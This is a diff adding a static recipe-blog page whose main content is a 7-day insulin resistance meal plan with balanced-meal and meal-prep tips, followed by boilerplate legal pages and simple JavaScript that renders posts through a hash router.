+    <li>A 7-day structure can create momentum without requiring a complicated diet plan.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Is an Insulin Resistance Meal Plan?</h2>
+
+<p>An insulin resistance meal plan is a way of organizing meals to help the body manage glucose more steadily. Insulin resistance occurs when the body has a harder time responding to insulin, the hormone that helps move glucose from the bloodstream into cells for energy. While nutrition is only one part of the bigger picture, meal choices can play a meaningful role in supporting more stable energy levels throughout the day.</p>
+
+<p>The goal is not to remove every carbohydrate or follow an overly strict diet. Instead, a smart insulin resistance diet plan focuses on pairing carbohydrates with protein, fiber, and fat. This combination can help slow digestion and create meals that are more filling and balanced.</p>
+
+<p>That is why the meal ideas in this weekly plan include foods such as eggs, chicken, Greek yogurt, salmon, lentils, vegetables, berries, avocado, quinoa, and sweet potatoes. These ingredients support a more balanced plate and offer variety across the week.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A helpful insulin resistance meal plan is not about eating the same bland meal every day. It is about creating repeatable meal patterns that combine satisfying protein, high-fiber plants, and smart carbohydrate choices in a way that feels realistic.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Core Formula for Balanced Insulin Resistance Meals</h2>
+
+<p>Before looking at the 7-day meal ideas, it helps to understand the basic structure behind them. Most blood sugar-friendly meals follow a simple formula: start with protein, add fiber-rich vegetables, include a smart carbohydrate, and finish with a source of healthy fat or flavor.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Protein Helps Create Lasting Fullness</h3>
+
+<p>Protein is one of the most important parts of an insulin resistance meal plan because it supports satiety and helps balance meals that include carbohydrates. Examples from this weekly plan include eggs, grilled chicken breast, Greek yogurt, salmon, and protein pancakes.</p>
+
+<p>Adding protein to breakfast can be especially helpful because it sets the tone for the rest of the day. A meal like veggie egg scramble with avocado toast gives the body more than just quick energy. It provides staying power and helps reduce the urge to snack soon after eating.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fiber Supports Slower Digestion</h3>
+
+<p>Fiber-rich foods help meals digest more gradually. Vegetables, berries, lentils, greens, chia seeds, beans, quinoa, and sweet potatoes all contribute fiber. These ingredients add volume, texture, and nutrients while making meals feel more complete.</p>
+
+<p>Fiber is one reason bowls and salads work so well for insulin resistance meal prep. A chicken taco bowl with black beans, avocado, salsa, greens, and vegetables can feel hearty and satisfying while still being built around nourishing ingredients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Smart Carbohydrates Can Still Be Included</h3>
+
+<p>Many people assume that insulin resistance eating means avoiding carbs entirely, but that is not the most practical or enjoyable approach for many households. Instead, the focus is on choosing carbohydrates that offer fiber, nutrients, or slower digestion.</p>
+
+<p>Sweet potatoes, lentil pasta, quinoa, whole-wheat toast, berries, and beans are all examples of carbohydrate sources that can work beautifully in a balanced meal. The key is portion awareness and thoughtful pairing.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">7-Day Insulin Resistance Meal Plan Ideas</h2>
+
+<p>This 7-day insulin resistance meal plan offers a practical set of meal ideas that can be used for lunch, dinner, or flexible meal prep. Each day highlights a different balanced meal style so the week feels varied and enjoyable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 1: Veggie Egg Scramble and Avocado Toast</h3>
+
+<p>A veggie egg scramble with avocado toast is a strong way to begin the week because it combines protein, healthy fats, and fiber in one satisfying meal. Eggs provide protein, while vegetables add color, texture, and nutrients. Avocado brings creaminess and healthy fat, making the meal feel more filling.</p>
+
+<p>Using whole-wheat or whole-grain toast can add fiber compared with refined bread. The key is balance: instead of eating toast alone, pairing it with eggs, vegetables, and avocado creates a more complete plate.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">How to Make It More Filling</h4>
+
+<ul>
+  <li>Add spinach, peppers, mushrooms, or tomatoes to the scramble.</li>
+  <li>Use one slice of hearty whole-grain toast.</li>
+  <li>Top with avocado, herbs, and a sprinkle of black pepper.</li>
+  <li>Add a side of berries for extra fiber and freshness.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 2: Grilled Chicken, Greens, and Roasted Sweet Potato</h3>
+
+<p>This meal is a classic balanced plate: lean protein, leafy greens, and a nutrient-rich carbohydrate. Grilled chicken breast adds protein, greens provide fiber and volume, and roasted sweet potato brings natural sweetness along with satisfying texture.</p>
+
+<p>Sweet potatoes can be an excellent option in a blood sugar-conscious meal when paired with protein and vegetables. Roasting them with herbs, garlic, paprika, or a small drizzle of olive oil makes them flavorful without needing heavy sauces.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Roast extra sweet potatoes and grill extra chicken at the beginning of the week. These two ingredients can be reused in salads, bowls, wraps, or quick dinners when you need a healthy meal fast.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 3: Greek Yogurt Bowl with Berries and Chia</h3>
+
+<p>A Greek yogurt bowl is simple, quick, and packed with balanced nutrition. Greek yogurt offers protein and a creamy base, while berries add natural sweetness, color, and fiber. Chia seeds contribute texture and help make the bowl more filling.</p>
+
+<p>This kind of meal works especially well for breakfast, a light lunch, or a satisfying snack. It can also be prepared in advance by layering yogurt and toppings in jars, although crunchy toppings are best added right before eating.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Best Toppings for a Balanced Yogurt Bowl</h4>
+
+<ul>
+  <li>Blueberries, raspberries, or sliced strawberries</li>
+  <li>Chia seeds or ground flaxseed</li>
+  <li>A small amount of nuts for crunch</li>
+  <li>Cinnamon for warmth and flavor</li>
+  <li>Unsweetened coconut flakes for texture</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 4: Lentil Pasta with Tomato Basil Sauce</h3>
+
+<p>Lentil pasta is a helpful alternative for anyone who wants a pasta-style meal with more protein and fiber than traditional refined pasta. Paired with tomato basil sauce, it becomes a comforting option that still fits into a balanced insulin resistance meal plan.</p>
+
+<p>Tomato-based sauces can add bright flavor without feeling heavy. Adding vegetables such as spinach, zucchini, mushrooms, or bell peppers can make the meal even more nutrient-dense. A sprinkle of parmesan or a side salad can round it out nicely.</p>
+
+<p>For better balance, consider serving lentil pasta with a portion of protein, such as grilled chicken, turkey meatballs, or a simple side of cottage cheese or Greek yogurt-based dressing if that suits your taste.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 5: Salmon with Quinoa and Steamed Veggies</h3>
+
+<p>Salmon with quinoa and steamed vegetables is a nutrient-rich meal that feels both simple and elevated. Salmon provides protein and healthy fats, quinoa adds a whole-grain style base with fiber, and steamed vegetables bring volume, color, and freshness.</p>
+
+<p>This meal is especially useful for meal prep because the components can be cooked separately and assembled when needed. Lemon juice, fresh herbs, garlic, and a light yogurt-based sauce can keep the flavors bright.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Simple Flavor Ideas</h4>
+
+<ul>
+  <li>Lemon, dill, and black pepper</li>
+  <li>Garlic, parsley, and olive oil</li>
+  <li>Paprika, lime, and chopped cilantro</li>
+  <li>Greek yogurt, cucumber, and herbs for a creamy sauce</li>
+</ul>
+
+<div style="background:#eef6ff;border:1px solid #bfdbfe;border-radius:12px;padding:18px 20px;margin:28px 0;color:#1e3a8a;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;">The best insulin resistance meals are not built around one single “perfect” food. They are built around combinations. Protein plus fiber plus healthy fat plus a smart carbohydrate can make a meal feel satisfying while supporting steadier energy.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 6: Chicken Taco Bowl with Salsa and Avocado</h3>
+
+<p>A chicken taco bowl is a great example of how healthy meals can still feel fun and flavorful. It uses familiar taco-inspired ingredients in a balanced bowl format. Grilled or seasoned chicken provides protein, beans and vegetables add fiber, salsa brings freshness, and avocado adds healthy fat.</p>
+
+<p>This meal is easy to customize based on what you have on hand. You can use romaine, cabbage, mixed greens, black beans, corn, tomatoes, onions, peppers, cilantro, lime, and a small portion of brown rice or cauliflower rice.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Bowls are one of the easiest formats for blood sugar-conscious meal planning because you can control portions while still enjoying layers of flavor, texture, and color.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Taco Bowl Builder</h4>
+
+<ol>
+  <li>Start with greens or shredded cabbage.</li>
+  <li>Add grilled chicken or another lean protein.</li>
+  <li>Include beans, corn, or a small portion of whole grain.</li>
+  <li>Top with salsa, avocado, lime, and herbs.</li>
+  <li>Finish with a spoonful of Greek yogurt instead of sour cream if desired.</li>
+</ol>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Day 7: Protein Pancakes with Fresh Berries</h3>
+
+<p>Protein pancakes with fresh berries are a satisfying way to include a weekend-style meal while still keeping balance in mind. Pancakes do not need to be off-limits in a healthy routine, especially when the recipe includes protein and is paired with high-fiber toppings like berries.</p>
+
+<p>Using protein powder, Greek yogurt, cottage cheese, eggs, or oat flour can help create pancakes that are more filling than a traditional refined flour version. Fresh berries add sweetness and color without relying on heavy syrup.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Healthier Pancake Topping Ideas</h4>
+
+<ul>
+  <li>Fresh strawberries, blueberries, or raspberries</li>
+  <li>A spoonful of Greek yogurt</li>
+  <li>Nut butter for healthy fat</li>
+  <li>Cinnamon or vanilla for sweetness without excess sugar</li>
+  <li>A small drizzle of maple syrup if desired</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Meal Prep This 7-Day Plan</h2>
+
+<p>Meal prep does not have to mean cooking every single meal in advance. For insulin resistance meal planning, it is often more useful to prep building blocks. This gives you flexibility while still making healthy choices easier during a busy week.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prep Proteins First</h3>
+
+<p>Cook a few protein options at the beginning of the week. Grilled chicken, boiled eggs, baked salmon, turkey patties, and Greek yogurt are convenient choices. When protein is ready, it becomes much easier to assemble a balanced meal quickly.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Wash and Chop Vegetables</h3>
+
+<p>Prepared vegetables save time and make healthy eating feel more automatic. Wash greens, chop peppers, slice cucumbers, roast broccoli, steam green beans, or prep salad toppings in containers.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Batch Cook Smart Carbs</h3>
+
+<p>Cook quinoa, roast sweet potatoes, prepare lentil pasta, or portion out whole-grain toast options. Having ready-to-use carbohydrates helps prevent last-minute choices that may feel less balanced.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Store meal components separately rather than fully assembling everything. This keeps ingredients fresher and allows you to mix and match meals based on your appetite and schedule.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Foods to Include for Insulin Resistance Support</h2>
+
+<p>A helpful insulin resistance diet plan includes a variety of nourishing foods. The more colorful and balanced your meals are, the easier it becomes to get a wide range of nutrients while staying satisfied.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Protein-Rich Foods</h3>
+
+<ul>
+  <li>Eggs</li>
+  <li>Chicken breast</li>
+  <li>Salmon</li>
+  <li>Greek yogurt</li>
+  <li>Lentils and beans</li>
+  <li>Turkey, tofu, or cottage cheese</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">High-Fiber Carbohydrates</h3>
+
+<ul>
+  <li>Sweet potatoes</li>
+  <li>Quinoa</li>
+  <li>Lentil pasta</li>
+  <li>Whole-grain toast</li>
+  <li>Berries</li>
+  <li>Black beans</li>
+  <li>Chia seeds</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Healthy Fats and Flavor Boosters</h3>
+
+<ul>
+  <li>Avocado</li>
+  <li>Olive oil</li>
+  <li>Nuts and seeds</li>
+  <li>Greek yogurt sauces</li>
+  <li>Fresh herbs</li>
+  <li>Salsa and lemon juice</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Simple Tips for Making the Plan Work in Real Life</h2>
+
+<p>A 7-day insulin resistance meal plan should make life easier, not harder. The most successful plans are flexible enough to fit real schedules, different appetites, family preferences, and budget needs.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Repeat Ingredients in Different Ways</h3>
+
+<p>You do not need seven completely different grocery lists. A few core ingredients can appear in multiple meals. Chicken can be used in a salad one day and a taco bowl the next. Greek yogurt can become breakfast, a snack, or a sauce. Greens can work in scrambles, bowls, and salads.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Balanced Snacks Ready</h3>
+
+<p>Snacks can support steady energy when they include protein or fiber. Consider Greek yogurt with berries, apple slices with nut butter, boiled eggs, cottage cheese, hummus with vegetables, or a small handful of nuts.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Do Not Skip Flavor</h3>
+
+<p>Healthy meals become easier to enjoy when they taste good. Use herbs, citrus, vinegar, garlic, ginger, paprika, salsa, mustard, tahini, or yogurt-based dressings. Flavor keeps the routine sustainable.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Build each meal around protein first.</li>
+    <li>Add fiber through vegetables, berries, beans, seeds, or whole grains.</li>
+    <li>Use healthy fats like avocado, olive oil, nuts, or salmon for satisfaction.</li>
+    <li>Choose smart carbs and pair them thoughtfully.</li>
+    <li>Meal prep components instead of rigid full meals for more flexibility.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>Even with healthy intentions, it is easy to create meals that are not as balanced as they could be. Avoiding a few common mistakes can make an insulin resistance meal plan more effective and enjoyable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Eating Carbs by Themselves</h3>
+
+<p>Carbohydrates are best balanced with protein, fiber, and fat. For example, toast alone may not be as satisfying as toast paired with eggs, vegetables, and avocado. Pancakes alone may not be as balanced as protein pancakes topped with berries and Greek yogurt.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Not Eating Enough</h3>
+
+<p>Restrictive meals can backfire by leaving you hungry and more likely to overeat later. A balanced insulin resistance meal plan should feel nourishing and sustainable. Meals should include enough protein, vegetables, and satisfying texture to keep you comfortable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Forgetting About Convenience</h3>
+
+<p>If a plan is too complicated, it is harder to maintain. Keep convenient options on hand, such as pre-washed greens, frozen vegetables, canned beans, cooked chicken, Greek yogurt, and microwaveable quinoa or brown rice.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: A Balanced 7-Day Plan Can Make Healthy Eating Feel Simple</h2>
+
+<p>A 7-day insulin resistance meal plan does not need to feel restrictive, boring, or overwhelming. With the right structure, it can be colorful, satisfying, and easy to repeat. Meals like veggie egg scramble with avocado toast, grilled chicken with greens and sweet potato, Greek yogurt with berries, lentil pasta, salmon with quinoa, chicken taco bowls, and protein pancakes show how much variety can fit into a balanced eating routine.</p>
+
+<p>The most important idea is consistency. Focus on building meals with protein, fiber, healthy fats, and smart carbohydrates. Choose ingredients you enjoy, prep a few basics ahead of time, and keep the plan flexible enough to match real life. When meals are both nourishing and enjoyable, healthy eating becomes much easier to maintain.</p>
+
+<p>Use this 7-day meal plan as inspiration for your next week of balanced meals, whether your goal is steadier energy, better meal prep habits, or a more thoughtful approach to insulin resistance-friendly eating.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Insulin Resistance Meal Plan</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Blood Sugar Balance</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein Meals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Balanced Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Carbs</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">7 Day Meal Plan</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Protein Rich Recipes</span>
+</div>
+
+                `
+                        }
+        ];
+
+        // Static Legal Pages (Exact content & keys preserved)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>My Awesome Blog</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At My Awesome Blog, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Core Logic (Preserved entirely)
+        const app = document.getElementById('app');
+        const blogUsername = "Katy Deliciously Easy Recipes Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Placeholder avatar image path
+
+        // Function to render the home dashboard (list of recipe posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 2px; font-size: 1rem; color: var(--primary-color);">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (e.g. Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 10px; padding-bottom: 10px;">
+                        <h1 style="font-family: 'Fraunces', serif; font-size: 2.3rem; margin-bottom: 30px;">${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Smooth scroll to top
+        }
+
+        // Function to render a single post detail view
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--text-color);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 2px; font-size: 1rem; color: var(--primary-color);">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Smooth scroll to top
+        }
+
+        // Client-side router navigation logic
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser navigation interactions (back/forward hashes)
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initialize view router on fresh load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
